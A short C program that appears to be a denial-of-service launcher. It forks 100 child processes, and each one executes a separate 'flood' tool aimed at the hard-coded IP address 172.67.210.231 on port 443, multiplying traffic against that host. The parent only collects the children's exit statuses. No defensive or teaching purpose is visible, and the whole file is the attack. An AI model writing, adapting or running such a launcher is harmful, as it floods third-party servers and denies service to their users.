#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/wait.h>

int main()
{
  pid_t pid, childpid;
  int i, status, exitcode;
  for (i = 0; i < 100; i++)
  {
    pid = fork();
    if (pid == 0)
    {
      break;
    }
  }

  if (i == 100)
  {
    while (1)
    {
      childpid = waitpid(-1, &status, WNOHANG);
      if (childpid == -1)
      {
        printf("all child done \n");
        return 0;
      }
      else if (childpid > 0)
      {
        if (WIFEXITED(status))
        {
          printf("child normal exited status %d \n", WEXITSTATUS(status));
        }
      }
    }
  }
  else
  {
    //  execl("/bin/ls",  "-al", "/etc/", NULL);

    execl("./flood", "flood", "-t", "172.67.210.231", "-p", "443", NULL);
    perror("execl");
    printf("child end\n");
  }

  return 0;
}
